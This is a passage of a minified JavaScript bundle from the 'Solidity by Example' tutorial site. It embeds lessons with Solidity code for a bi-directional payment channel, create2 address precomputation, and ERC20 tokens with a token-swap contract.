(this["webpackJsonpsolidity-by-example"]=this["webpackJsonpsolidity-by-example"]||[]).push([[0],{11:function(s,a,n){s.exports={component:"Header_component__1tkkW",logo:"Header_logo__2ins2",header:"Header_header__3mObx",versions:"Header_versions__eOBao",bar:"Header_bar__23jec",version:"Header_version__1QJXf"}},14:function(s,a,n){s.exports={component:"App_component__1dd61",main:"App_main__3ZkGI",footer:"App_footer__29Fsv"}},17:function(s,a,n){s.exports={component:"Example_component__mzuGC",content:"Example_content__3-AiU"}},18:function(s,a,n){s.exports={component:"Label_component__G3rSZ"}},32:function(s,a,n){},39:function(s,a,n){"use strict";n.r(a);var l=n(1),e=n(16),p=(n(32),n(26)),t=n(3),c=n(14),r=n.n(c),o=n(11),i=n.n(o),h=n.p+"static/media/logo.9a07f18c.svg",j=n(0);var d=function(){return Object(j.jsxs)("div",{className:i.a.component,children:[Object(j.jsx)("a",{href:"/",children:Object(j.jsx)("img",{src:h,alt:"logo",className:i.a.logo})}),Object(j.jsxs)("h3",{className:i.a.header,children:[Object(j.jsx)("a",{href:"/",children:"Solidity by Example"}),Object(j.jsx)("div",{className:i.a.versions,children:Object(j.jsx)("div",{className:i.a.version,children:"version 0.7.6"})})]})]})},u=n(8),y=n.n(u);const m="0x95a647B3d8a3F11176BAdB799b9499C671fa243a";var w=function(){return Object(j.jsxs)("div",{className:y.a.component,children:[Object(j.jsxs)("div",{className:y.a.row,children:["Donate",Object(j.jsx)("span",{role:"img","aria-label":"smiley",children:"\ud83d\ude42"})]}),Object(j.jsx)("div",{className:y.a.row,children:Object(j.jsxs)("a",{href:"https://etherscan.io/address/".concat(m),target:"__blank",children:[m.slice(0,6),"...",m.slice(-6,-1)]})}),Object(j.jsxs)("div",{className:y.a.row,children:["your ETH will directly go to",Object(j.jsx)("a",{href:"https://khanacademy.org",target:"__blank",className:y.a.khan,children:"Khan Academy"})]}),Object(j.jsx)("div",{className:y.a.row,children:Object(j.jsx)("a",{href:"mailto:contact@solidity-by-example.org",children:"contact@solidity-by-example.org"})}),Object(j.jsxs)("div",{className:y.a.row,children:[Object(j.jsx)("a",{href:"https://github.com/solidity-by-example/solidity-by-example.github.io",target:"__blank",children:"source"}),Object(j.jsx)("div",{className:y.a.bar,children:"|"}),Object(j.jsx)("a",{href:"https://github.com/solidity-by-example/solidity-by-example.github.io/blob/gh-pages/LICENSE",target:"__blank",children:"license"})]})]})},k=n(23);var b=({title:s,description:a})=>Object(j.jsxs)(k.a,{children:[Object(j.jsx)("title",{children:s}),Object(j.jsx)("meta",{name:"Description",content:a})]});n(36);var f=({html:s})=>(Object(l.useEffect)((()=>{if("ReactSnap"===navigator.userAgent)return;document.querySelectorAll("pre").forEach((s=>{const a=document.createElement("div");a.className="buttons";const n=document.createElement("button");n.className="fa fa-copy clip-button",n.title="Copy to clipboard",n.ariaLabel="Copy to clipboard";const l=document.createElement("i");l.className="tooltiptext",n.appendChild(l),a.appendChild(n);const e=s.firstChild;s.insertBefore(a,e),n.addEventListener("click",(a=>{a.preventDefault(),(s=>{const a=document.createElement("textarea");a.setAttribute("style","width:1px;border:0;opacity:0;"),document.body.appendChild(a),a.value=s.innerText,a.select(),document.execCommand("copy"),document.body.removeChild(a)})(s.childNodes[1])}))}))}),[]),Object(j.jsx)("div",{dangerouslySetInnerHTML:{__html:s}})),g=n(17),_=n.n(g);var v=({title:s,version:a,description:n,html:l})=>Object(j.jsxs)("div",{className:_.a.component,children:[Object(j.jsx)(b,{title:"".concat(s," | Solidity by Example | ").concat(a),description:n}),Object(j.jsxs)("div",{className:_.a.content,children:[Object(j.jsx)("h2",{children:s}),Object(j.jsx)(f,{html:l}),Object(j.jsxs)("p",{children:["Try on"," ",Object(j.jsx)("a",{href:"https://remix.ethereum.org",target:"__blank",children:"Remix"})]})]})]});var x=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Bi-Directional Payment Channel",description:"An example of bi-directional payment channels in Solidity",html:'<p>Bi-directional payment channels allow participants <code>Alice</code> and <code>Bob</code> to repeatedly transfer Ether off chain.</p>\n<p>Payments can go both ways, <code>Alice</code> pays <code>Bob</code> and <code>Bob</code> pays <code>Alice</code>.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">experimental</span> <span class="hljs-built_in">ABIEncoderV2</span>;</span>\n\n<span class="hljs-comment">/*\nOpening a channel\n1. Alice and Bob fund a multi-sig wallet\n2. Precompute payment channel address\n3. Alice and Bob exchanges signatures of initial balances\n4. Alice and Bob creates a transaction that can deploy a payment channel from\n   the multi-sig wallet\n\nUpdate channel balances\n1. Repeat steps 1 - 3 from opening a channel\n2. From multi-sig wallet create a transaction that will\n   - delete the transaction that would have deployed the old payment channel\n   - and then create a transaction that can deploy a payment channel with the\n     new balances\n\nClosing a channel when Alice and Bob agree on the final balance\n1. From multi-sig wallet create a transaction that will\n   - send payments to Alice and Bob\n   - and then delete the transaction that would have created the payment channel\n\nClosing a channel when Alice and Bob do not agree on the final balances\n1. Deploy payment channel from multi-sig\n2. call challengeExit() to start the process of closing a channel\n3. Alice and Bob can withdraw funds once the channel is expired\n*/</span>\n\n<span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol"</span>;\n<span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/cryptography/ECDSA.sol"</span>;\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">BiDirectionalPaymentChannel</span> </span>{\n    <span class="hljs-keyword">using</span> <span class="hljs-title">SafeMath</span> <span class="hljs-title"><span class="hljs-keyword">for</span></span> <span class="hljs-title"><span class="hljs-keyword">uint</span></span>;\n    <span class="hljs-keyword">using</span> <span class="hljs-title">ECDSA</span> <span class="hljs-title"><span class="hljs-keyword">for</span></span> <span class="hljs-title"><span class="hljs-keyword">bytes32</span></span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">ChallengeExit</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> sender, <span class="hljs-keyword">uint</span> nonce</span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> to, <span class="hljs-keyword">uint</span> amount</span>)</span>;\n\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">public</span> users;\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">bool</span>) <span class="hljs-keyword">public</span> isUser;\n\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;\n\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> challengePeriod;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> expiresAt;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> nonce;\n\n    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">checkBalances</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _balances</span>) </span>{\n        <span class="hljs-built_in">require</span>(\n            <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span> &gt;= _balances[<span class="hljs-number">0</span>].add(_balances[<span class="hljs-number">1</span>]),\n            <span class="hljs-string">"balance of contract must be &gt;= to the total balance of users"</span>\n        );\n        <span class="hljs-keyword">_</span>;\n    }\n\n    <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> deposit from multi-sig wallet</span>\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">\n        <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _users,\n        <span class="hljs-keyword">uint</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _balances,\n        <span class="hljs-keyword">uint</span> _expiresAt,\n        <span class="hljs-keyword">uint</span> _challengePeriod\n    </span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> <span class="hljs-title">checkBalances</span>(<span class="hljs-params">_balances</span>) </span>{\n        <span class="hljs-built_in">require</span>(_expiresAt &gt; <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>, <span class="hljs-string">"Expiration must be &gt; now"</span>);\n        <span class="hljs-built_in">require</span>(_challengePeriod &gt; <span class="hljs-number">0</span>, <span class="hljs-string">"Challenge period must be &gt; 0"</span>);\n\n        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; _users.<span class="hljs-built_in">length</span>; i++) {\n            <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> user = _users[i];\n\n            <span class="hljs-built_in">require</span>(!isUser[user], <span class="hljs-string">"user must be unique"</span>);\n            users[i] = user;\n            isUser[user] = <span class="hljs-literal">true</span>;\n\n            balances[user] = _balances[i];\n        }\n\n        expiresAt = _expiresAt;\n        challengePeriod = _challengePeriod;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span>(<span class="hljs-params">\n        <span class="hljs-keyword">bytes</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _signatures,\n        <span class="hljs-keyword">address</span> _contract,\n        <span class="hljs-keyword">address</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _signers,\n        <span class="hljs-keyword">uint</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _balances,\n        <span class="hljs-keyword">uint</span> _nonce\n    </span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{\n        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; _signatures.<span class="hljs-built_in">length</span>; i++) {\n            <span class="hljs-comment">/*\n            <span class="hljs-doctag">NOTE:</span> sign with address of this contract to protect\n                  agains replay attack on other contracts\n            */</span>\n            <span class="hljs-keyword">bool</span> valid = _signers[i] ==\n                <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(_contract, _balances, _nonce))\n                    .toEthSignedMessageHash()\n                    .recover(_signatures[i]);\n\n            <span class="hljs-keyword">if</span> (!valid) {\n                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;\n            }\n        }\n\n        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">checkSignatures</span>(<span class="hljs-params">\n        <span class="hljs-keyword">bytes</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _signatures,\n        <span class="hljs-keyword">uint</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _balances,\n        <span class="hljs-keyword">uint</span> _nonce\n    </span>) </span>{\n        <span class="hljs-comment">// Note: copy storage array to memory</span>\n        <span class="hljs-keyword">address</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> signers;\n        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; users.<span class="hljs-built_in">length</span>; i++) {\n            signers[i] = users[i];\n        }\n\n        <span class="hljs-built_in">require</span>(\n            verify(_signatures, <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>), signers, _balances, _nonce),\n            <span class="hljs-string">"Invalid signature"</span>\n        );\n\n        <span class="hljs-keyword">_</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">onlyUser</span>(<span class="hljs-params"></span>) </span>{\n        <span class="hljs-built_in">require</span>(isUser[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>], <span class="hljs-string">"Not user"</span>);\n        <span class="hljs-keyword">_</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">challengeExit</span>(<span class="hljs-params">\n        <span class="hljs-keyword">uint</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _balances,\n        <span class="hljs-keyword">uint</span> _nonce,\n        <span class="hljs-keyword">bytes</span>[<span class="hljs-number">2</span>] <span class="hljs-keyword">memory</span> _signatures\n    </span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span>\n        <span class="hljs-title">onlyUser</span>\n        <span class="hljs-title">checkSignatures</span>(<span class="hljs-params">_signatures, _balances, _nonce</span>)\n        <span class="hljs-title">checkBalances</span>(<span class="hljs-params">_balances</span>)\n    </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> &lt; expiresAt, <span class="hljs-string">"Expired challenge period"</span>);\n        <span class="hljs-built_in">require</span>(_nonce &gt; nonce, <span class="hljs-string">"Nonce must be greater than the current nonce"</span>);\n\n        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; _balances.<span class="hljs-built_in">length</span>; i++) {\n            balances[users[i]] = _balances[i];\n        }\n\n        nonce = _nonce;\n        expiresAt = <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>.add(challengePeriod);\n\n        <span class="hljs-keyword">emit</span> ChallengeExit(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, nonce);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title">onlyUser</span> </span>{\n        <span class="hljs-built_in">require</span>(\n            <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> &gt;= expiresAt,\n            <span class="hljs-string">"Challenge period has not expired yet"</span>\n        );\n\n        <span class="hljs-keyword">uint</span> amount = balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];\n        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-number">0</span>;\n\n        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: amount}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n\n        <span class="hljs-keyword">emit</span> Withdraw(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, amount);\n    }\n}\n</code></pre>\n'})};var S=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Precompute Contract Address with Create2",description:"Precompute contract address with create2",html:'<p>Contract address can be precomputed, before the contract is deployed, using <code>create2</code></p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Factory</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Deployed</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> addr, <span class="hljs-keyword">uint256</span> salt</span>)</span>;\n\n    <span class="hljs-comment">// 1. Get bytecode of contract to be deployed</span>\n    <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> _owner and _foo are arguments of the TestContract&#x27;s constructor</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBytecode</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _owner, <span class="hljs-keyword">uint</span> _foo</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> bytecode = <span class="hljs-built_in">type</span>(TestContract).<span class="hljs-built_in">creationCode</span>;\n\n        <span class="hljs-keyword">return</span> <span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(bytecode, <span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encode</span>(_owner, _foo));\n    }\n\n    <span class="hljs-comment">// 2. Compute the address of the contract to be deployed</span>\n    <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> _salt is a random number used to create an address</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAddress</span>(<span class="hljs-params"><span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> bytecode, <span class="hljs-keyword">uint</span> _salt</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">address</span></span>) </span>{\n        <span class="hljs-keyword">bytes32</span> hash = <span class="hljs-built_in">keccak256</span>(\n            <span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(\n                <span class="hljs-keyword">bytes1</span>(<span class="hljs-number">0xff</span>),\n                <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>),\n                _salt,\n                <span class="hljs-built_in">keccak256</span>(bytecode)\n            )\n        );\n\n        <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> cast last 20 bytes of hash to address</span>\n        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-keyword">uint160</span>(<span class="hljs-keyword">uint256</span>(hash)));\n    }\n\n    <span class="hljs-comment">// 3. Deploy the contract</span>\n    <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span></span>\n    <span class="hljs-comment">// Check the event log Deployed which contains the address of the deployed TestContract.</span>\n    <span class="hljs-comment">// The address in the log should equal the address computed from above.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deploy</span>(<span class="hljs-params"><span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> bytecode, <span class="hljs-keyword">uint</span> _salt</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-keyword">address</span> addr;\n\n        <span class="hljs-comment">/*\n        <span class="hljs-doctag">NOTE:</span> How to call create2\n\n        create2(v, p, n, s)\n        create new contract with code at memory p to p + n\n        and send v wei\n        and return the new address\n        where new address = first 20 bytes of keccak256(0xff + address(this) + s + keccak256(mem[p\u2026(p+n)))\n              s = big-endian 256-bit value\n        */</span>\n        <span class="hljs-keyword">assembly</span> {\n            addr := <span class="hljs-built_in">create2</span>(\n                <span class="hljs-built_in">callvalue</span>(), <span class="hljs-comment">// wei sent with current call</span>\n                <span class="hljs-comment">// Actual code starts after skipping the first 32 bytes</span>\n                <span class="hljs-built_in">add</span>(bytecode, <span class="hljs-number">0x20</span>),\n                <span class="hljs-built_in">mload</span>(bytecode), <span class="hljs-comment">// Load the size of code contained in the first 32 bytes</span>\n                _salt <span class="hljs-comment">// Salt from function arguments</span>\n            )\n\n            <span class="hljs-keyword">if</span> <span class="hljs-built_in">iszero</span>(<span class="hljs-built_in">extcodesize</span>(addr)) {\n                <span class="hljs-keyword">revert</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)\n            }\n        }\n\n        <span class="hljs-keyword">emit</span> Deployed(addr, _salt);\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">TestContract</span> </span>{\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> foo;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _owner, <span class="hljs-keyword">uint</span> _foo</span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        owner = _owner;\n        foo = _foo;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;\n    }\n}\n</code></pre>\n'})};var E=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"ERC20",description:"Example of ERC20 token in Solidity",html:'<p>Any contract that follow the <a href="https://eips.ethereum.org/EIPS/eip-20" target="__blank">ERC20 standard</a> is a ERC20 token.</p>\n<p>ERC20 tokens provide functionalities to</p>\n<ul>\n<li>transfer tokens</li>\n<li>allow others to transfer tokens on behalf of the token holder</li>\n</ul>\n<p>Here is the interface for ERC20.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.sol</span>\n<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IERC20</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">totalSupply</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">balanceOf</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> account</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title"><span class="hljs-built_in">transfer</span></span>(<span class="hljs-params"><span class="hljs-keyword">address</span> recipient, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">allowance</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> owner, <span class="hljs-keyword">address</span> spender</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> spender, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transferFrom</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> sender, <span class="hljs-keyword">address</span> recipient, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)</span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> <span class="hljs-keyword">from</span>, <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> to, <span class="hljs-keyword">uint256</span> value</span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Approval</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> owner, <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> spender, <span class="hljs-keyword">uint256</span> value</span>)</span>;\n}\n</code></pre>\n<h2 id="create-your-own-erc20-token">Create your own ERC20 token</h2>\n<p>Using <a href="https://github.com/OpenZeppelin/openzeppelin-contracts" target="__blank">Open Zeppelin</a> it&#39;s really easy to create your own ERC20 token.</p>\n<p>Here is an example</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-keyword">import</span> <span class="hljs-string">"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/ERC20.sol"</span>;\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">MyToken</span> <span class="hljs-keyword">is</span> <span class="hljs-title">ERC20</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> name, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> symbol</span>) <span class="hljs-title">ERC20</span>(<span class="hljs-params">name, symbol</span>) </span>{\n        <span class="hljs-comment">// Mint 100 tokens to msg.sender</span>\n        <span class="hljs-comment">// Similar to how</span>\n        <span class="hljs-comment">// 1 dollar = 100 cents</span>\n        <span class="hljs-comment">// 1 token = 1 * (10 ** decimals)</span>\n        _mint(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-number">100</span> * <span class="hljs-number">10</span> ** <span class="hljs-keyword">uint</span>(decimals()));\n    }\n}</code></pre>\n<h2 id="contract-to-swap-tokens">Contract to swap tokens</h2>\n<p>Here is an example contract, <code>TokenSwap</code>, to trade one ERC20 token for another.</p>\n<p>This contract will swap tokens by calling</p>\n<pre><code class="language-solidity">transferFrom(<span class="hljs-keyword">address</span> sender, <span class="hljs-keyword">address</span> recipient, <span class="hljs-keyword">uint256</span> amount)\n</code></pre>\n<p>which will transfer <code>amount</code> of token from <code>sender</code> to <code>recipient</code>.</p>\n<p>For <code>transferFrom</code> to succeed, <code>sender</code> must</p>\n<ul>\n<li>have more than <code>amount</code> tokens in their balance</li>\n<li>allowed <code>TokenSwap</code> to withdraw <code>amount</code> tokens by calling <code>approve</code></li>\n</ul>\n<p>prior to <code>TokenSwap</code> calling <code>transferFrom</code></p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-keyword">import</span> <span class="hljs-string">"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.sol"</span>;\n\n<span class="hljs-comment">/*\nHow to swap tokens\n\n1. Alice has 100 tokens from AliceCoin, which is a ERC20 token.\n2. Bob has 100 tokens from BobCoin, which is also a ERC20 token.\n3. Alice and Bob wants to trade 10 AliceCoin for 20 BobCoin.\n4. Alice or Bob deploys TokenSwap\n5. Alice appproves TokenSwap to withdraw 10 tokens from AliceCoin\n6. Bob appproves TokenSwap to withdraw 20 tokens from BobCoin\n7. Alice or Bob calls TokenSwap.swap()\n8. Alice and Bob traded tokens successfully.\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">TokenSwap</span> </span>{\n    IERC20 <span class="hljs-keyword">public</span> token1;\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner1;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> amount1;\n    IERC20 <span class="hljs-keyword">public</span> token2;\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner2;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> amount2;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">\n        <span class="hljs-keyword">address</span> _token1,\n        <span class="hljs-keyword">address</span> _owner1,\n        <span class="hljs-keyword">uint</span> _amount1,\n        <span class="hljs-keyword">address</span> _token2,\n        <span class="hljs-keyword">address</span> _owner2,\n        <span class="hljs-keyword">uint</span> _amount2\n    </span>) </span>{\n        token1 = IERC20(_token1);\n        owner1 = _owner1;\n        amount1 = _amount1;\n        token2 = IERC20(_token2);\n        owner2 = _owner2;\n        amount2 = _amount2;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">swap</span>(<span class="hljs-params"></span>) <span 